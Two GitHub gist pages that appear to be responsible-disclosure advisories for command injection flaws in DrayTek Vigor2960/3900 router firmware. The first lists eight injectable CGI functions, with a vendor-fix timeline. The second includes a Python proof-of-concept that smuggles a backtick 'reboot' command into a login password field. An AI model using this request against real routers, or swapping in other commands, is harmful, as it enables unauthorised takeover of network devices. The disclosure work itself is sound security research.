=== Content from gist.github.com_4c7c3d43_20250119_120827.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F46165779215f1d47ec257210428c0240)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F46165779215f1d47ec257210428c0240&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F46165779215f1d47ec257210428c0240) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F46165779215f1d47ec257210428c0240&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@WinMin](https://avatars.githubusercontent.com/u/18380453?s=64&v=4)](/WinMin)

# [WinMin](/WinMin)/**[Disclosure of vulnerabilities in Vigor2960 and Vigor3900.md](/WinMin/46165779215f1d47ec257210428c0240)**

Last active
August 18, 2022 08:27

Show Gist options

* [Download ZIP](/WinMin/46165779215f1d47ec257210428c0240/archive/4d6ed51937e9ab5007ae660770bf396addeaf713.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F46165779215f1d47ec257210428c0240)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F46165779215f1d47ec257210428c0240)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240.js&quot;&gt;&lt;/script&gt;
* Save WinMin/46165779215f1d47ec257210428c0240 to your computer and use it in GitHub Desktop.

[Code](/WinMin/46165779215f1d47ec257210428c0240)
[Revisions
16](/WinMin/46165779215f1d47ec257210428c0240/revisions)
[Stars
1](/WinMin/46165779215f1d47ec257210428c0240/stargazers)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240.js&quot;&gt;&lt;/script&gt;

Save WinMin/46165779215f1d47ec257210428c0240 to your computer and use it in GitHub Desktop.

[Download ZIP](/WinMin/46165779215f1d47ec257210428c0240/archive/4d6ed51937e9ab5007ae660770bf396addeaf713.zip)

Disclosure of vulnerabilities in Vigor2960 and Vigor3900

 [Raw](/WinMin/46165779215f1d47ec257210428c0240/raw/4d6ed51937e9ab5007ae660770bf396addeaf713/Disclosure%2520of%2520vulnerabilities%2520in%2520Vigor2960%2520and%2520Vigor3900.md)

[**Disclosure of vulnerabilities in Vigor2960 and Vigor3900.md**](#file-disclosure-of-vulnerabilities-in-vigor2960-and-vigor3900-md)

## Version

Vigor2960 fw1.5.1.1RC3 (r8167) Vigor3900 fw1.5.1.1beta\_r8167

## Vulnerability details

There are some command injection vulnerabilities in the mainfunction.cgi file. The details are as follows:

**1. in downlaod\_ovpn function**

[![](https://camo.githubusercontent.com/2462234dd9c1b83c192d0da59cb6cb35470024f5d3402857c06b22b957e7296d/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138313433302e706e67)](https://camo.githubusercontent.com/2462234dd9c1b83c192d0da59cb6cb35470024f5d3402857c06b22b957e7296d/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138313433302e706e67)

The parameters from http\_input are written directly to the buf of s without filtering, followed by system, which can causecommand injection

**2. in doOpenVpn function**

[![](https://camo.githubusercontent.com/15c96e9cf07f2d2e3378ff1e11f39f46be0d493ebba808e83cfeffe058e7db7e/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138313632322e706e67)](https://camo.githubusercontent.com/15c96e9cf07f2d2e3378ff1e11f39f46be0d493ebba808e83cfeffe058e7db7e/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138313632322e706e67)

The value of "option" is from "http\_input" and later concatenated and used by "system" without any special characters sanitizing, causing command injection

**3. int dumpSyslog\_func**

[![](https://camo.githubusercontent.com/06c47038d5b8c776125f10d99e86726fb5de22e91629055d23234ce7867fb4f9/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138323230312e706e67)](https://camo.githubusercontent.com/06c47038d5b8c776125f10d99e86726fb5de22e91629055d23234ce7867fb4f9/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138323230312e706e67)

The value of "option" is from "http\_input", and single quote character allowed. So, since it is user-controllable, when user input closes the single quote, a command injection is done.

**4. in get\_subconfig\_func**

[![](https://camo.githubusercontent.com/b9f09bc24436797507d8fc0d7282c48b6d25eac6e51951e39c5961503d72fb92/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138323533342e706e67)](https://camo.githubusercontent.com/b9f09bc24436797507d8fc0d7282c48b6d25eac6e51951e39c5961503d72fb92/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138323533342e706e67)

"rtick" is from "http\_input", and further passed to "sub\_F2D8". In "sub\_F2D8", "rtick" is concatenated to "/tmp/ipv6\_neigh\_", then passed to "system", causing command injection.

[![](https://camo.githubusercontent.com/cdf9f9fa1453bf3c8e42e696656b8194578131483ef4ae0914974f431a6532b6/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138323633312e706e67)](https://camo.githubusercontent.com/cdf9f9fa1453bf3c8e42e696656b8194578131483ef4ae0914974f431a6532b6/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138323633312e706e67)

**5. in set\_ap\_map\_config\_func**

The value of "option" is from "http\_input",and will be spliced with "/sbin/ipsec\_new\_cer" , may cause command execution

[![](https://camo.githubusercontent.com/07e3f544562a20821cab058e951a0a86cfe8b094e3088b7022cb50ea1c79a0c4/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333030382e706e67)](https://camo.githubusercontent.com/07e3f544562a20821cab058e951a0a86cfe8b094e3088b7022cb50ea1c79a0c4/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333030382e706e67)

**6. in delete\_wlan\_profile\_func**

The value of "profile\_number " is from "http\_input" and will be spliced with "uci delete apm\_wlan\_profile.profile"， may cause command execution

[![](https://camo.githubusercontent.com/8fc141c9e77842db770f95839152aee375a6720763c7ad0026cd83b70bcff727/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333630352e706e67)](https://camo.githubusercontent.com/8fc141c9e77842db770f95839152aee375a6720763c7ad0026cd83b70bcff727/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333630352e706e67)

**7. in ruequest\_certificate\_func**

The value of "option" will be spliced with "/sbin/ipsec\_new\_cer" , may cause command execution

[![](https://camo.githubusercontent.com/3e2b984485d91de63a02198b4e313ca3f23f4fe9fc68c33932e89d7b53082501/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333634362e706e67)](https://camo.githubusercontent.com/3e2b984485d91de63a02198b4e313ca3f23f4fe9fc68c33932e89d7b53082501/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333634362e706e67)

**8. in doGRETunnel\_func**

The table value will be spliced with "/etc/init.d/gretunnel disconnect\_from\_web '%s' 1>/dev/null 2>&1" ， may cause command execution

[![](https://camo.githubusercontent.com/b890c8b0b287838aacc83b19433f0b955f8559c6c371c7f23aeacdeb5f7c479a/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333333382e706e67)](https://camo.githubusercontent.com/b890c8b0b287838aacc83b19433f0b955f8559c6c371c7f23aeacdeb5f7c479a/68747470733a2f2f73772d626c6f672e6f73732d636e2d686f6e676b6f6e672e616c6979756e63732e636f6d2f696d672f32303230303631383138333333382e706e67)

## Discoverer

swing@chaitin

Cossack9989@NJUPT

## Final

Thanks for draytek's instant response!

## Timeline

2020.05.29 report these vulnerabilities

2020.06.01 vendor reply

2020.06.04 vendor fix these vulnerabilities

2020.06.17 vendor released new firmware

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FWinMin%2F46165779215f1d47ec257210428c0240)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_81ba3f81_20250119_120826.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCossack9989%2Ffa9718434ceee4e6d4f6b0ad672c10f1)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCossack9989%2Ffa9718434ceee4e6d4f6b0ad672c10f1&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCossack9989%2Ffa9718434ceee4e6d4f6b0ad672c10f1) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCossack9989%2Ffa9718434ceee4e6d4f6b0ad672c10f1&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Cossack9989](https://avatars.githubusercontent.com/u/32336251?s=64&v=4)](/Cossack9989)

# [Cossack9989](/Cossack9989)/**[DrayTek-Vigor-CMDi.md](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1)** Secret

Last active
March 28, 2022 09:44

Show Gist options

* [Download ZIP](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1/archive/4f5c697d4015f7307edf89405ec67b7193ebc677.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FCossack9989%2Ffa9718434ceee4e6d4f6b0ad672c10f1)You must be signed in to star a gist
* [Fork
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FCossack9989%2Ffa9718434ceee4e6d4f6b0ad672c10f1)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1.js&quot;&gt;&lt;/script&gt;
* Save Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1 to your computer and use it in GitHub Desktop.

[Code](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1)
[Revisions
3](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1/revisions)
[Stars
1](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1/stargazers)
[Forks
1](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1.js&quot;&gt;&lt;/script&gt;

Save Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1 to your computer and use it in GitHub Desktop.

[Download ZIP](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1/archive/4f5c697d4015f7307edf89405ec67b7193ebc677.zip)

 [Raw](/Cossack9989/fa9718434ceee4e6d4f6b0ad672c10f1/raw/4f5c697d4015f7307edf89405ec67b7193ebc677/DrayTek-Vigor-CMDi.md)

[**DrayTek-Vigor-CMDi.md**](#file-draytek-vigor-cmdi-md)

## An unauthorized **Command Injection** @ mainfunction.cgi

* Products: DrayTek Vigor2960/3900
* Firmware: < version 1.5.1.1
* Severity: high

We found an unauthorized CMDi @ mainfunction.cgi with the precondition that the router can be authorized by SMS. The vulnerability will be triggered by `frompassword` value containig injected commands such as "123456`reboot`".

If the router supports login by SMS and the user's phone number or the content of `/var/sms_phone_auth` is known by the attacker, then the attacker will be able to inject arbitary command by an evil payload such as the injection of `reboot` as the payload below.

```
from sys import argv
from base64 import b64encode
import requests

data = {
    "URL": "192.168.1.1",
    "HOST": "http://192.168.1.1",
    "action": "authuser",
    "formusername": b64encode(b"test").decode(),
    "formpassword": b64encode(b"12345678`reboot`").decode(),
    "PHONENUMBER": argv[1] # the known phone number
}
header = {
    "Content-Type": "application/raw"
}
url = {
    "root": "http://192.168.1.1",
    "cgi": {
        "root": "/cgi-bin",
        "uri": {
            "mf": "/mainfunction.cgi",
        }
    }
}

def build_url(p1, p2=None):
    if p2:
        return url["root"] + url[p1]["root"] + url[p1]["uri"][p2]
    else:
        return url["root"] + url[p1]

session = requests.session()
session.post(build_url("cgi", "mf"), data=data, headers=header)

```

**Founder**:

* C0ss4ck @ NJUPT (email: c0ss4ck9989@gmail.com)
* Swings @ Chaitin (email: weiming.shi@chaitin.com)
* MozhuCY @ NJUPT (email: mozhucy@gmail.com)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FCossack9989%2Ffa9718434ceee4e6d4f6b0ad672c10f1)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


